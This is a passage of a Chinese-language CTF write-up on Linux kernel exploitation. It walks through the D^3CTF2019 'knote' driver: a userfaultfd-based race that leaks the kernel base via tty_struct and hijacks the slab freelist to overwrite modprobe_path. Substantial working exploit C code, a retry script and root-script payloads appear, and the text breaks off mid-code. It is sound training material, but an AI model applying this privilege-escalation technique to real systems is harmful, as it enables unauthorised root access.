class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> page_size;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * [åœ¨è¿™åœé¡¿.jpg]</span><br><span class="hljs-comment">         * å½“ poll è¿”å›æ—¶è¯´æ˜å‡ºç°äº†ç¼ºé¡µå¼‚å¸¸</span><br><span class="hljs-comment">         * ä½ å¯ä»¥åœ¨è¿™é‡Œæ’å…¥ä¸€äº›æ¯”å¦‚è¯´ sleep() ä¸€ç±»çš„æ“ä½œ</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="ä¾‹é¢˜ï¼šD-3CTF2019-knote"><a href="#ä¾‹é¢˜ï¼šD-3CTF2019-knote" class="headerlink" title="ä¾‹é¢˜ï¼šD^3CTF2019 - knote"></a>ä¾‹é¢˜ï¼šD^3CTF2019 - knote</h3><blockquote><p><a href="https://arttnba3.cn/download/d3ctf2019/knote.7z">ç‚¹å‡»ä¸‹è½½-knote.7z</a></p></blockquote><h4 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>é¦–å…ˆæŸ¥çœ‹å¯åŠ¨è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cd</span> /home/ctf<br>qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./rootfs.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic \<br>-monitor /dev/null \<br>-smp cores=2,threads=1 \<br>-cpu qemu64,+smep,+smap<br></code></pre></div></td></tr></table></figure><p>å¼€å¯äº† smapã€smepã€kaslr ä¿æŠ¤</p><p>å°† <code>note.ko</code> æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼š</p><p>åªå®šä¹‰äº† ioctlï¼Œåœ¨ ioctl ä¸­å®šä¹‰äº†å¸¸è§„çš„èœå•å †ï¼Œé™åˆ¶äº†<strong>åªèƒ½è°ƒç”¨ ioctl 9 æ¬¡</strong>ï¼Œä¸è¿‡ä¼šåœ¨å…³é—­çš„æ—¶å€™é‡ç½®</p><p><a href="https://i.loli.net/2021/09/10/92QLxShmiUT8Xu6.png"><img src="https://s2.loli.net/2023/02/06/OjZKlPBMrh8dXsD.png" alt="image.png"></a></p><p><a href="https://i.loli.net/2021/09/23/t1nAMvBskzq3gLF.png"><img src="https://s2.loli.net/2023/02/06/vgWVpyxtbz6ukZC.png" alt="image.png"></a></p><p>ç®€è¦åˆ†æå¯çŸ¥æˆ‘ä»¬åº”å½“ä¼ å…¥å¦‚ä¸‹æ•°æ®ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-keyword">size_t</span> size;<br>        <span class="hljs-keyword">size_t</span> index;<br>    &#125;;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125; Chunk;<br></code></pre></div></td></tr></table></figure><p>add å ç”¨å†™é”ï¼Œé™åˆ¶ size åœ¨ 0x1000 ä»¥ä¸‹ï¼Œä¸è¿‡å¯¹äºå¸¸ç”¨ç»“æ„ä½“è€Œè¨€å¤Ÿç”¨äº†ï¼›è¿™é‡Œçš„å…¨å±€æ•°ç»„ buf åŒä¸º chunk ç±»å‹</p><p><a href="https://i.loli.net/2021/09/23/VTH4u1l7LCGgYUb.png"><img src="https://s2.loli.net/2023/02/06/jUn6qyN1GIWVgf4.png" alt="image.png"></a></p><p>edit æ²¡åŠ é”ï¼Œç”¨ copy_user_generic_unrolled ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®ï¼ˆå…¶å®å°±æ˜¯ copy_from_user çš„æ ¸å¿ƒè¢«ç¼–è¯‘å™¨ä¼˜åŒ–æå–å‡ºæ¥äº†ï¼‰</p><p><a href="https://i.loli.net/2021/09/23/rTWXMhsSn1ANxim.png"><img src="https://s2.loli.net/2023/02/06/raBDuczY4XPJ9Om.png" alt="image.png"></a></p><p>get å‘ç”¨æˆ·ç©ºé—´æ‹·è´ chunk å†…æ•°æ®ï¼Œä¹Ÿæ²¡åŠ é”</p><p><a href="https://i.loli.net/2021/09/23/OqiejEnCNzIRAGD.png"><img src="https://s2.loli.net/2023/02/06/LkaX4CoMn1U5mFd.png" alt="image.png"></a></p><p>del å äº†å†™é”</p><p><a href="https://i.loli.net/2021/09/23/xq7JTY2GlHIUebn.png"><img src="https://s2.loli.net/2023/02/06/H2r5OImKQoq69Ec.png" alt="image.png"></a></p><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>åœ¨ Get() å½“ä¸­ä½¿ç”¨äº† user_copy_generic_unrolled å‘ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‘å†…æ ¸ä¼ å…¥ä¸€å—è¢« userfaultfd ç›‘è§†çš„ mmap ç©ºé—´ï¼Œåœ¨ userfaultfd çº¿ç¨‹ä¸­å…ˆå°†æ‹·è´æš‚åœä¸‹æ¥ï¼Œéšååœ¨å¦ä¸€ä¸ªçº¿ç¨‹å½“ä¸­<strong>å°†è¿™ä¸ª object é‡Šæ”¾æ‰åï¼Œé‡æ–°åˆ†é…åˆ°ä¸€äº›ç‰¹æ®Šçš„ä½ç½®</strong>ï¼ˆä¾‹å¦‚ tty_structï¼‰ï¼Œç”±æ­¤åœ¨æ‹·è´çº¿ç¨‹é‡æ–°å¯åŠ¨åä¾¿èƒ½ä»è¯¥ object ä¸­è¯»å‡ºæˆ‘ä»¬æƒ³è¦çš„æ•°æ®</p><h5 id="æ³„éœ²å†…æ ¸åŸºå€"><a href="#æ³„éœ²å†…æ ¸åŸºå€" class="headerlink" title="æ³„éœ²å†…æ ¸åŸºå€"></a>æ³„éœ²å†…æ ¸åŸºå€</h5><p>ç¬”è€…åœ¨è¿™é‡Œé€‰æ‹©å°†å…¶åˆ†é…åˆ° tty_struct ä¸Šï¼Œä»ä¸­ leak æ•°æ®ï¼Œä¸è¿‡åœ¨è¿™é‡Œåœ¨æ‰“å¼€ <code>/dev/ptmx</code> åä¼¼ä¹æ²¡æ³•ç›´æ¥åˆ†é…åˆ° tty_struct ï¼ˆtty é­”æ•° 0x5401 not matchï¼‰ï¼Œè€Œæ˜¯åˆ†é…åˆ°äº†ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹ï¼Œä¸è¿‡æˆ‘ä»¬ä»èƒ½ä»ä¸­è·å–åˆ°å†…æ ¸ç›¸å…³å‡½æ•°åœ°å€ä»è€Œæ³„éœ²å‡ºå†…æ ¸åŸºå€</p><p><a href="https://i.loli.net/2021/09/23/51MfNIQCoyE86Sv.png"><img src="https://s2.loli.net/2023/02/06/JYTxbSX7dmikoPc.png" alt="image.png"></a></p><p>ç›¸åº”åœ°ï¼Œåœ¨æœ¬é¢˜ä¸­å¹¶æœªå¼€å¯ hardened freelistï¼Œæ•…æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç›´æ¥é€šè¿‡æ¡ä»¶ç«äº‰åŠ«æŒ freelist ä»è€Œæ„é€ å†…æ ¸ä»»æ„åœ°å€å†™ï¼Œè€Œç°åœ¨æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†å†…æ ¸åŸºå€ï¼Œè¯¥è€ƒè™‘å¾€å“ªå†™ã€å†™ä»€ä¹ˆäº†</p><h5 id="modprobe-path-ä»¥-root-æ‰§è¡Œç¨‹åº"><a href="#modprobe-path-ä»¥-root-æ‰§è¡Œç¨‹åº" class="headerlink" title="modprobe_path ä»¥ root æ‰§è¡Œç¨‹åº"></a>modprobe_path ä»¥ root æ‰§è¡Œç¨‹åº</h5><p>å½“æˆ‘ä»¬å°è¯•å»æ‰§è¡Œï¼ˆexecveï¼‰ä¸€ä¸ªéæ³•çš„æ–‡ä»¶ï¼ˆfile magic not foundï¼‰ï¼Œå†…æ ¸ä¼šç»å†å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">entry_SYSCALL_64()<br>    sys_execve()<br>        do_execve()<br>            do_execveat_common()<br>                bprm_execve()<br>                    exec_binprm()<br>                        search_binary_handler()<br>                            __request_module() <span class="hljs-comment">// wrapped as request_module</span><br>                                call_modprobe()<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­ <code>call_modprobe()</code> å®šä¹‰äº <code>kernel/kmod.c</code>ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™éƒ¨åˆ†ä»£ç ï¼ˆä»¥ä¸‹æ¥ç€å†…æ ¸æºç 5.14ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">call_modprobe</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *module_name, <span class="hljs-keyword">int</span> wait)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    argv[<span class="hljs-number">0</span>] = modprobe_path;<br>    argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-q&quot;</span>;<br>    argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;--&quot;</span>;<br>    argv[<span class="hljs-number">3</span>] = module_name;    <span class="hljs-comment">/* check free_modprobe_argv() */</span><br>    argv[<span class="hljs-number">4</span>] = <span class="hljs-literal">NULL</span>;<br><br>    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,<br>                     <span class="hljs-literal">NULL</span>, free_modprobe_argv, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (!info)<br>        <span class="hljs-keyword">goto</span> free_module_name;<br><br>    <span class="hljs-keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);<br>    <span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>åœ¨è¿™é‡Œè°ƒç”¨äº†å‡½æ•° <code>call_usermodehelper_exec()</code> å°† <code>modprobe_path</code> ä½œä¸ºå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä»¥ root æƒé™å°†å…¶æ‰§è¡Œï¼Œè¿™ä¸ªåœ°å€ä¸Šé»˜è®¤å­˜å‚¨çš„å€¼ä¸º<code>/sbin/modprobe</code></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤ŸåŠ«æŒ modprobe_pathï¼Œå°†å…¶æ”¹å†™ä¸ºæˆ‘ä»¬æŒ‡å®šçš„æ¶æ„è„šæœ¬çš„è·¯å¾„ï¼Œéšåæˆ‘ä»¬å†æ‰§è¡Œä¸€ä¸ªéæ³•æ–‡ä»¶ï¼Œ<strong>å†…æ ¸å°†ä¼šä»¥ root æƒé™æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„è„šæœ¬</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬çš„ exp å°±å¾ˆå®¹æ˜“æ„é€ å‡ºæ¥äº†ï¼šé€šè¿‡ä¸¤æ¬¡ userfaultfd åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼Œç¬¬ä¸€æ¬¡æ³„éœ²å‡ºå†…æ ¸åŠ è½½çš„åŸºå€ï¼Œç¬¬äºŒæ¬¡åˆ™åŠ«æŒ modprobe_pathï¼Œéšåæ‰§è¡Œä¸€ä¸ªéæ³•æ–‡ä»¶å³å¯è·å¾— flag</p><p>ç”±äº slub çš„æœºåˆ¶çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¹¶ä¸ä¸€å®šèƒ½å¤Ÿä¿è¯èƒ½å¤Ÿä¸€æ¬¡ä¾¿èƒ½åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦çš„ objectï¼Œåœ¨è¿™é‡Œç¬”è€…å†™äº†ä¸€ä¸ªè„šæœ¬æ¥å¤šæ¬¡å°è¯•æ‰§è¡Œæˆ‘ä»¬çš„ expï¼Œè€Œå†…æ ¸åŸºå€åªéœ€è¦æ³„æ¼ä¸€æ¬¡ï¼Œæ•…ç¬”è€…åœ¨è¿™é‡Œåœ¨æˆåŠŸä¹‹åä¾¿å†™å…¥ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œè‹¥æ²¡èƒ½ä¸€æ¬¡é€šå…³åˆ™åœ¨ä¸‹ä¸€æ¬¡é‡æ–°è¿è¡Œ exp æ—¶ä¾¿èƒ½ç›´æ¥ä»ç¬¬äºŒæ¬¡ userfaultfd å¼€å§‹</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">do</span><br>    ./exp<br><span class="hljs-keyword">done</span><br></code></pre></div></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯å½“æˆ‘ä»¬åŠ«æŒ modprobe_path å <strong>slub ä¸­çš„ freelist ä¾¿ä¸å†åˆæ³•</strong>ï¼Œè€Œå½“æˆ‘ä»¬é€€å‡ºè¿›ç¨‹æ—¶ä¼šå›æ”¶å†…å­˜ï¼Œæ­¤æ—¶ä¾¿ä¼šæ£€æµ‹åˆ°éæ³•çš„ freelist ä»è€Œå¯¼è‡´ oopsï¼Œå› æ­¤æœ€åæˆ‘ä»¬ä¸è¦ç«‹é©¬é€€å‡ºæˆ‘ä»¬çš„expï¼Œç¬”è€…è¿™é‡Œé€‰æ‹©èµ·ä¸€ä¸ªæ–°çš„ shell</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DO_SAK_WORK 0xffffffff815d4ef0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MODPROBE_PATH 0xffffffff8245c5c0</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> page_size;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">sem_t</span> sem_add, sem_edit;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        sleep(<span class="hljs-number">10</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) 